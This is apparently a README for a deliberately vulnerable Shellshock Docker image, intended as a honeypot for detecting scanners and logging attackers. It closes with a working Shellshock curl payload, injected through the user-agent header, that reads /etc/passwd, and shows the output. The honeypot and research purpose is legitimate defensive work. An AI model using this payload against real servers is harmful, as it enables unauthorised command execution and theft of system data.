### Shellshock

As this is in the Honey Net branch, you should assume that it is meant for creation of Honey Pots only.

You should never expose this build in your actual network unless you take proper precautions.

Since this is a well known vulnerability, it will do well in a Honey Pot, more specifically, it will be useful to filter out typical scanners from someone that is actually trying to exploit your network.

When this kind of action is logged in whatever solution you want to use, you can blacklist that IP before it continues attacking the rest of your network.

Since attackers usually go for weaker targets first, they should focus on this kind of application before anything else, which will give you ample time to prepare and blacklist. This can also serve for re-search purposes, as depending on your logging software, you can log what the attacker is doing once they gain access.

INSTRUCTIONS:

1. Follow the links and instructions on my Docker account:

https://hub.docker.com/r/nksnksnks/shellshock/

https://store.docker.com/community/images/nksnksnks/shellshock

Pull the image from here with:

```
docker pull nksnksnks/shellshock
````

If this is successfull, skip to step 5 and add the appropriate image name or better yet follow the instructions on the Link above.

If for some reason you can't pull and wan't do to it manually, follow the steps below.

2. Download all of the files from the repository, including the vulnerable application.

3. After your image is successfully built, you can raise it with:

```
sudo docker run -d -p 8080:80 <docker-image-name>
```

6. To enter your new container and install whatever logging system you want, you can do the following:

```
docker exec -u 0 -it <container-name> bash
```

7. Congratulations, you have a working vulnerable app.

___NOTE: The OS on which this was tested was Ubuntu 16.04 LTS with Docker CE installed.___

___NOTE 2: The image used from Docker Hub is Ubuntu based, so any logging solution that you can think of that will work with Ubuntu will probably work for you, only thing to keep in mind is the ports you'll need to add for said solution.___

___NOTE 3: Make sure you limit your containers resources and security so it doesn't spread to your host in any way.___

Result:

```
root@honey-net-worker1:~# curl -H                                       \
> "user-agent:                                  \
> () { :; }; echo; echo;                        \
> /bin/bash -c 'cat /etc/passwd'"               \
> http://localhost:8080/cgi-bin/test-page.cgi

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
```

